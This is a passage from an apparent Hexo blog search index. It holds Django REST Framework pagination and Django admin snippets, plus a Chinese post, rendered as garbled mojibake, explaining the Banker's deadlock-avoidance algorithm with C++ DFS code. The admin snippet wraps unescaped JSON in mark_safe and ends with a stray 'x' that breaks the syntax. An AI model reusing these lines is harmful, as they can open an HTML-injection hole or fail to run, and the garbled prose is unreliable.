class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">paginate_queryset</span>(<span class="params">self, queryset, request, view=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.request = request</span><br><span class="line">        unlimited = <span class="variable language_">self</span>.get_unlimited(request)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            unlimited <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">        ):</span><br><span class="line">            page_size = queryset.count()</span><br><span class="line">            <span class="keyword">if</span> page_size == <span class="number">0</span>:</span><br><span class="line">              page_size = <span class="number">1</span></span><br><span class="line">            paginator = <span class="variable language_">self</span>.django_paginator_class(queryset, page_size)</span><br><span class="line">            <span class="variable language_">self</span>.page = paginator.page(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">list</span>(<span class="variable language_">self</span>.page)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().paginate_queryset(queryset, request, view)</span><br></pre></td></tr></table></figure>

</details>

<details>
<summary>views.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> viewsets</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestViewSet</span>(viewsets.ModelViewSet):</span><br><span class="line">    ...</span><br><span class="line">    pagination_unlimited = <span class="literal">True</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestViewSet</span>(viewsets.ModelViewSet):</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pagination_unlimited</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.action == <span class="string">&quot;XXXX&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<h1 id="Django-Admin"><a href="#Django-Admin" class="headerlink" title="Django Admin"></a><a name="django-admin">Django Admin</a></h1><h2 id="Display-JSONField"><a href="#Display-JSONField" class="headerlink" title="Display JSONField"></a><a name="display-JSONField">Display JSONField</a></h2><p>åœ¨Django Adminä¸­æ›´å‹å¥½çš„å±•ç¤º<code>JSONField</code>å­—æ®µçš„å€¼.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.utils.safestring <span class="keyword">import</span> mark_safe</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    readonly_fields = (<span class="string">&quot;pretty_config&quot;</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pretty_config</span>(<span class="params">self, obj</span>):</span><br><span class="line">        result = json.dumps(</span><br><span class="line">            obj.config, indent=<span class="number">2</span>, sort_keys=<span class="literal">True</span>, ensure_ascii=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> mark_safe(<span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;result&#125;</span>&lt;/pre&gt;&quot;</span>)x </span><br></pre></td></tr></table></figure>

<h2 id="Override-UserAdmin"><a href="#Override-UserAdmin" class="headerlink" title="Override UserAdmin"></a><a name="override-user-admin">Override UserAdmin</a></h2><p>åŸºäº<a href="https://github.com/django/django/blob/517d3bb4dd17e9c51690c98d747b86a0ed8b2fbf/django/contrib/auth/admin.py#L44">django@517d3bb</a>çš„<code>UserAdmin</code>æºç ,ç§»é™¤æ— å…³å­—æ®µçš„<code>UserAdmin</code>å¦‚ä¸‹.</p>
<details>
<summary>admin/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserAdmin</span>(<span class="title class_ inherited__">DjangoUserAdmin</span>):</span><br><span class="line">    fieldsets = (</span><br><span class="line">        (<span class="literal">None</span>, &#123;<span class="string">&quot;fields&quot;</span>: (<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)&#125;),</span><br><span class="line">        (</span><br><span class="line">            _(<span class="string">&quot;Personal info&quot;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fields&quot;</span>: (</span><br><span class="line">                    <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">                    <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">                    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            &#125;,</span><br><span class="line">        ),</span><br><span class="line">        (</span><br><span class="line">            _(<span class="string">&quot;Permissions&quot;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fields&quot;</span>: (</span><br><span class="line">                    <span class="string">&quot;is_active&quot;</span>,</span><br><span class="line">                    <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">                    <span class="string">&quot;is_superuser&quot;</span>,</span><br><span class="line">                    <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">                    <span class="comment"># &quot;user_permissions&quot;,</span></span><br><span class="line">                ),</span><br><span class="line">            &#125;,</span><br><span class="line">        ),</span><br><span class="line">        (_(<span class="string">&quot;Important dates&quot;</span>), &#123;<span class="string">&quot;fields&quot;</span>: (<span class="string">&quot;last_login&quot;</span>, <span class="string">&quot;date_joined&quot;</span>)&#125;),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    list_display = (</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">    )</span><br><span class="line">    search_fields = (</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    filter_horizontal = (</span><br><span class="line">        <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;user_permissions&quot;,</span></span><br><span class="line">    )</span><br><span class="line">    list_filter = (</span><br><span class="line">        <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">        <span class="string">&quot;is_superuser&quot;</span>,</span><br><span class="line">        <span class="string">&quot;is_active&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

</details>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>é“¶è¡Œå®¶ç®—æ³•(ä½¿ç”¨DFSæ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—)</title>
    <url>/posts/647653334/</url>
    <content><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><h3 id="é“¶è¡Œå®¶ç®—æ³•"><a href="#é“¶è¡Œå®¶ç®—æ³•" class="headerlink" title="é“¶è¡Œå®¶ç®—æ³•"></a>é“¶è¡Œå®¶ç®—æ³•</h3><p>é“¶è¡Œå®¶ç®—æ³•æ˜¯ä¸€ç§æœ€æœ‰ä»£è¡¨æ€§çš„é¿å…æ­»é”çš„ç®—æ³•ã€‚åœ¨é¿å…æ­»é”æ–¹æ³•ä¸­å…è®¸è¿›ç¨‹åŠ¨æ€åœ°ç”³è¯·èµ„æºï¼Œä½†ç³»ç»Ÿåœ¨è¿›è¡Œèµ„æºåˆ†é…ä¹‹å‰ï¼Œåº”å…ˆè®¡ç®—æ­¤æ¬¡åˆ†é…èµ„æºçš„å®‰å…¨æ€§ï¼Œè‹¥åˆ†é…ä¸ä¼šå¯¼è‡´ç³»ç»Ÿè¿›å…¥ä¸å®‰å…¨çŠ¶æ€ï¼Œåˆ™åˆ†é…ï¼Œå¦åˆ™ç­‰å¾…ã€‚ä¸ºå®ç°é“¶è¡Œå®¶ç®—æ³•ï¼Œç³»ç»Ÿå¿…é¡»è®¾ç½®è‹¥å¹²æ•°æ®ç»“æ„ã€‚</p>
<span id="more"></span>

<h3 id="å®‰å…¨çŠ¶æ€"><a href="#å®‰å…¨çŠ¶æ€" class="headerlink" title="å®‰å…¨çŠ¶æ€"></a>å®‰å…¨çŠ¶æ€</h3><ul>
<li>ç³»ç»Ÿèƒ½æŒ‰æŸç§è¿›ç¨‹æ¨è¿›é¡ºåº{P<sub>1</sub>ï¼Œâ€¦ï¼ŒP<sub>n</sub>}ä¸ºæ¯ä¸ªè¿›ç¨‹P<sub>i</sub>åˆ†é…å…¶æ‰€éœ€èµ„æºï¼Œç›´è‡³æ»¡è¶³æ¯ä¸ªè¿›ç¨‹å¯¹èµ„æºçš„æœ€å¤§éœ€æ±‚ï¼Œä½¿æ¯ä¸ªè¿›ç¨‹éƒ½å¯é¡ºåˆ©åœ°å®Œæˆã€‚</li>
<li>æ­¤æ—¶ç§°{P<sub>1</sub>ï¼Œâ€¦ï¼ŒP<sub>n</sub>}ä¸ºå®‰å…¨åºåˆ—ã€‚å¦‚æœç³»ç»Ÿæ— æ³•æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå®‰å…¨åºåˆ—ï¼Œåˆ™ç§°ç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€ã€‚</li>
<li>å¹¶éæ‰€æœ‰ä¸å®‰å…¨çŠ¶æ€éƒ½å¿…ç„¶ä¼šè½¬ä¸ºæ­»é”çŠ¶æ€ï¼Œä½†å½“ç³»ç»Ÿè¿›å…¥ä¸å®‰å…¨çŠ¶æ€åï¼Œå°±æœ‰å¯èƒ½è¿›å…¥æ­»é”çŠ¶æ€ã€‚åä¹‹ï¼Œåªè¦ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ï¼Œç³»ç»Ÿä¾¿ä¸ä¼šè¿›å…¥æ­»é”çŠ¶æ€ã€‚</li>
<li>å› æ­¤ï¼Œé¿å…æ­»é”çš„å®è´¨åœ¨äºï¼Œç³»ç»Ÿåœ¨è¿›è¡Œèµ„æºåˆ†é…æ—¶ï¼Œåº”ç”¨ç³»ç»Ÿä¸è¿›å…¥ä¸å®‰å…¨çŠ¶æ€ã€‚</li>
</ul>
<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><ol>
<li>å¯åˆ©ç”¨èµ„æºå‘é‡Available<br>æ˜¯ä¸ªå«æœ‰mä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œå…¶ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ä»£è¡¨ä¸€ç±»å¯åˆ©ç”¨çš„èµ„æºæ•°ç›®ã€‚å¦‚æœAvailable[j]&#x3D;Kï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿä¸­ç°æœ‰Rjç±»èµ„æºKä¸ªã€‚</li>
<li>æœ€å¤§éœ€æ±‚çŸ©é˜µMax<br>è¿™æ˜¯ä¸€ä¸ªnÃ—mçš„çŸ©é˜µï¼Œå®ƒå®šä¹‰äº†ç³»ç»Ÿä¸­nä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸€ä¸ªè¿›ç¨‹å¯¹mç±»èµ„æºçš„æœ€å¤§éœ€æ±‚ã€‚å¦‚æœMax[i,j]&#x3D;Kï¼Œåˆ™è¡¨ç¤ºè¿›ç¨‹iéœ€è¦R<sub>j</sub>ç±»èµ„æºçš„æœ€å¤§æ•°ç›®ä¸ºKã€‚</li>
<li>åˆ†é…çŸ©é˜µAllocation<br>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªnÃ—mçš„çŸ©é˜µï¼Œå®ƒå®šä¹‰äº†ç³»ç»Ÿä¸­æ¯ä¸€ç±»èµ„æºå½“å‰å·²åˆ†é…ç»™æ¯ä¸€è¿›ç¨‹çš„èµ„æºæ•°ã€‚å¦‚æœAllocation[i,j]&#x3D;Kï¼Œåˆ™è¡¨ç¤ºè¿›ç¨‹iå½“å‰å·²åˆ†å¾—R<sub>j</sub>ç±»èµ„æºçš„æ•°ç›®ä¸ºKã€‚</li>
<li>éœ€æ±‚çŸ©é˜µNeedã€‚<br>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªnÃ—mçš„çŸ©é˜µï¼Œç”¨ä»¥è¡¨ç¤ºæ¯ä¸€ä¸ªè¿›ç¨‹å°šéœ€çš„å„ç±»èµ„æºæ•°ã€‚å¦‚æœNeed[i,j]&#x3D;Kï¼Œåˆ™è¡¨ç¤ºè¿›ç¨‹iè¿˜éœ€è¦R<sub>j</sub>ç±»èµ„æºKä¸ªï¼Œæ–¹èƒ½å®Œæˆå…¶ä»»åŠ¡ã€‚<br>Need[i,j]&#x3D;Max[i,j]-Allocation[i,j]</li>
</ol>
<h2 id="é“¶è¡Œå®¶ç®—æ³•-1"><a href="#é“¶è¡Œå®¶ç®—æ³•-1" class="headerlink" title="é“¶è¡Œå®¶ç®—æ³•"></a>é“¶è¡Œå®¶ç®—æ³•</h2><p>è®¾Request<sub>i</sub>æ˜¯è¿›ç¨‹P<sub>i</sub>çš„è¯·æ±‚å‘é‡ï¼Œå¦‚æœRequest<sub>i</sub>[j]&#x3D;K,è¡¨ç¤ºè¿›ç¨‹P<sub>i</sub>éœ€è¦Kä¸ªR<sub>j</sub>ç±»å‹ã€‚å½“P<sub>i</sub>å‘å‡ºèµ„æºè¯·æ±‚åï¼Œç³»ç»ŸæŒ‰ä¸‹è¾“æ­¥éª¤è¿›è¡Œæ£€æŸ¥:</p>
<ol>
<li>å¦‚æœRequest<sub>i</sub>[j] &lt;&#x3D; Need[i][j],ä¾¿è½¬å‘æ­¥éª¤2ï¼›å¦åˆ™è®¤ä¸ºå‡ºé”™ï¼Œå› ä¸ºå®ƒæ‰€éœ€è¦çš„èµ„æºæ•°å·²è¶…è¿‡å®ƒæ‰€å®£å¸ƒçš„æœ€å¤§å€¼</li>
<li>å¦‚æœRequest<sub>i</sub>[j] &lt;&#x3D; Available[i][j]ï¼Œä¾¿è½¬å‘æ­¥éª¤3ï¼›å¦åˆ™è¡¨ç¤ºå°šæ— è¶³å¤Ÿèµ„æºï¼ŒP<sub>i</sub>éœ€ç­‰å¾…  </li>
<li>ç³»ç»Ÿè¯•æ¢ç€æŠŠèµ„æºåˆ†é…ç»™è¿›ç¨‹P<sub>i</sub>,å¹¶ä¿®æ”¹ä¸‹é¢æ•°æ®ç»“æ„ä¸­çš„æ•°å€¼:<ul>
<li>Available[j] -&#x3D; Request<sub>i</sub>[j]</li>
<li>Allocation[i][j] +&#x3D; Request<sub>i</sub>[j]</li>
<li>Need[i][j] -&#x3D; Request<sub>i</sub>[j]</li>
</ul>
</li>
<li>ç³»ç»Ÿæ‰§è¡Œå®‰å…¨æ€§ç®—æ³•ï¼Œæ£€æŸ¥æ­¤æ¬¡èµ„æºåˆ†é…åç³»ç»Ÿæ˜¯å¦å¤„äºå®‰å…¨çŠ¶æ€.è‹¥å®‰å…¨ï¼Œæ­£å¼å°†èµ„æºåˆ†é…ç»™è¿›ç¨‹P<sub>i</sub>ï¼Œä»¥å®Œæˆæœ¬æ¬¡åˆ†é…ï¼›å¦åˆ™ï¼Œè®²å°†æœ¬æ¬¡çš„è¯•æ¢åˆ†é…ä½œåºŸ,æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€ï¼Œè®©è¿›ç¨‹P<sub>i</sub>ç­‰å¾…</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æŒ‰ç…§é“¶è¡Œå®¶ç®—æ³•æ£€æŸ¥èµ„æºè¯·æ±‚</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Request[j] &gt; Need[i][j] || Request[j] &gt; Available[j])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(i, Request);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å°è¯•åˆ†é…èµ„æº-æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€"><a href="#å°è¯•åˆ†é…èµ„æº-æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€" class="headerlink" title="å°è¯•åˆ†é…èµ„æº&#x2F;æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€"></a>å°è¯•åˆ†é…èµ„æº&#x2F;æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€</h2><h3 id="å°è¯•åˆ†é…èµ„æº"><a href="#å°è¯•åˆ†é…èµ„æº" class="headerlink" title="å°è¯•åˆ†é…èµ„æº"></a>å°è¯•åˆ†é…èµ„æº</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æ›´æ–°æ•°æ®</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] -= Request[j];</span><br><span class="line">        Allocation[i][j] += Request[j];</span><br><span class="line">        Need[i][j] -= Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€"><a href="#æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€" class="headerlink" title="æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€"></a>æ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span><span class="comment">//è¿˜åŸæ•°æ®</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] += Request[j];</span><br><span class="line">        Allocation[i][j] -= Request[j];</span><br><span class="line">        Need[i][j] += Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®‰å…¨æ€§ç®—æ³•"><a href="#å®‰å…¨æ€§ç®—æ³•" class="headerlink" title="å®‰å…¨æ€§ç®—æ³•"></a>å®‰å…¨æ€§ç®—æ³•</h2><ol>
<li>è®¾ç½®ä¸¤ä¸ªå·¥ä½œå‘é‡:<br>â‘  å·¥ä½œå‘é‡WORKï¼Œå®ƒè¡¨ç¤ºç³»ç»Ÿå¯æä¾›ç»™è¿›ç¨‹ç»§ç»­è¿è¡Œæ‰€éœ€çš„å„ç±»èµ„æºæ•°ç›®ï¼Œå®ƒå«æœ‰mä¸ªå…ƒç´ ï¼Œåœ¨æ‰§è¡Œå®‰å…¨ç®—æ³•å¼€å§‹æ—¶ï¼ŒWORK:&#x3D;Available<br>â‘¡ Finish:å®ƒè¡¨ç¤ºç³»ç»Ÿæ˜¯å¦æœ‰è¶³å¤Ÿçš„èµ„æºåˆ†é…ç»™è¿›ç¨‹ï¼Œä½¿ä¹‹è¿è¡Œå®Œæˆã€‚åˆå§‹Finish[i]: &#x3D; falseï¼›å½“æœ‰è¶³å¤Ÿèµ„æºåˆ†é…ç»™è¿›ç¨‹æ—¶ï¼Œå†ä»¤Finish[i]ï¼š&#x3D;trueã€‚ </li>
<li>ä»è¿›ç¨‹é›†åˆä¸­æ‰¾å‡ºä¸€ä¸ªæ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„è¿›ç¨‹ï¼š<br>â‘  Finish[i] &#x3D; false<br>â‘¡ Need[i][j] &lt;&#x3D; work[j]<br>è‹¥æ‰¾åˆ°ï¼Œæ‰§è¡Œ3,å¦åˆ™ï¼Œæ‰§è¡Œæ­¥éª¤4</li>
<li>å½“è¿›ç¨‹p<sub>i</sub>è·å¾—èµ„æºåï¼Œå¯é¡ºåˆ©æ‰§è¡Œï¼Œç›´è‡³å®Œæˆï¼Œå¹¶é‡Šæ”¾å‡ºåˆ†é…ç»™å®ƒçš„èµ„æºï¼Œæ•…åº”æ‰§è¡Œ:</li>
</ol>
<ul>
<li>Finish[i] &#x3D; true </li>
<li>WORK[j] +&#x3D; Allocation[i][j]</li>
<li>go to step 2</li>
</ul>
<ol start="4">
<li>å¦‚æœæ‰€æœ‰è¿›ç¨‹çš„Finish[i] &#x3D; trueï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿå¤„äºå®‰å…¨æ€§çŠ¶æ€ï¼Œå¦åˆ™ï¼Œç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€ã€‚</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//æ£€æŸ¥ç³»ç»Ÿå®‰å…¨æ€§</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Work[MaxNumber];</span><br><span class="line">    <span class="type">bool</span> Finished[MaxNumber];</span><br><span class="line">    <span class="built_in">memset</span>(Finished, <span class="literal">false</span>, <span class="built_in">sizeof</span>(Finished));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        Work[i] = Available[i];</span><br><span class="line">    sta = UnSafe;</span><br><span class="line">    <span class="built_in">Dfs</span>(<span class="number">0</span>, Work, Finished);</span><br><span class="line">    <span class="keyword">if</span>(sta==UnSafe)</span><br><span class="line">        <span class="built_in">recovery</span>(i, Request);<span class="comment">//è¿˜åŸæ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> sta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤æ‚åº¦åˆ†æ:å®‰å…¨æ€§æ£€æŸ¥ç®—æ³•ï¼Œæœ‰ä¸¤ç§forå¾ªç¯ï¼Œæœ€å†…å±‚forå¾ªç¯æ¯æ¬¡ç»§ç»­å‘ä¸‹ä¸€å±‚æœç´¢ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO((n * m)^ n)</p>
<h2 id="åˆ©ç”¨Dfsæ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—"><a href="#åˆ©ç”¨Dfsæ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—" class="headerlink" title="åˆ©ç”¨Dfsæ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—"></a>åˆ©ç”¨Dfsæ‰¾å‡ºæ‰€æœ‰å®‰å…¨åºåˆ—</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Work[], <span class="type">bool</span> Finished[])</span><span class="comment">//æ·±åº¦ä¼˜å…ˆæœç´¢,æ‰¾åˆ°æ‰€æœ‰çš„å®‰å…¨åºåˆ—</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sta = Safe;</span><br><span class="line">        SafeOrder.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        <span class="comment">//temp.clear();</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">bool</span> t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(Need[j][k] &gt; Work[k])</span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t == <span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                    Work[k] += Allocation[j][k];</span><br><span class="line">                Finished[j] = <span class="literal">true</span>;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">                <span class="built_in">Dfs</span>(i + <span class="number">1</span>, Work, Finished);</span><br><span class="line">                temp.<span class="built_in">pop_back</span>();       <span class="comment">//å›æº¯,å°†ç¬¬iä¸ªè¿›ç¨‹æ‰€åšçš„æ”¹å˜æ¢å¤</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Work[k] -= Allocation[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                Finished[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æµ‹è¯•æ•°æ®"><a href="#æµ‹è¯•æ•°æ®" class="headerlink" title="æµ‹è¯•æ•°æ®"></a>æµ‹è¯•æ•°æ®</h2><div class="note default no-icon"><p>3
A 3
B 3
C 2
5
7 5 3
3 2 2
9 0 2
2 2 2
4 3 3
0 1 0
2 0 0
3 0 2
2 1 1
0 0 2
2
1
1
0
2
</p></div>

<h2 id="å®éªŒæˆªå›¾"><a href="#å®éªŒæˆªå›¾" class="headerlink" title="å®éªŒæˆªå›¾"></a>å®éªŒæˆªå›¾</h2><p>![åˆç†ä¸”å®‰å…¨çš„èµ„æºè¯·æ±‚](&#x2F;images&#x2F;Banker&#39;s Algorithm1.jpg)</p>
<center>åˆç†ä¸”å®‰å…¨çš„èµ„æºè¯·æ±‚</center>
![ä¸åˆç†çš„èµ„æºè¯·æ±‚](/images/Banker's Algorithm2.jpg)
<center>ä¸åˆç†çš„èµ„æºè¯·æ±‚</center>
![ä¼šå¯¼è‡´ç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€çš„èµ„æºè¯·æ±‚](/images/Banker's Algorithm3.jpg)
<center>ä¼šå¯¼è‡´ç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€çš„èµ„æºè¯·æ±‚</center>

<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Problem:é“¶è¡Œå®¶ç®—æ³•</span></span><br><span class="line"><span class="comment">Author:QiZhao</span></span><br><span class="line"><span class="comment">Data:2018-05-31</span></span><br><span class="line"><span class="comment">Description:é¢„é˜²è¿›ç¨‹æ­»é”çš„é“¶è¡Œå®¶ç®—æ³•</span></span><br><span class="line"><span class="comment">Copyright  2018 QiZhao. All rights reserved.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span 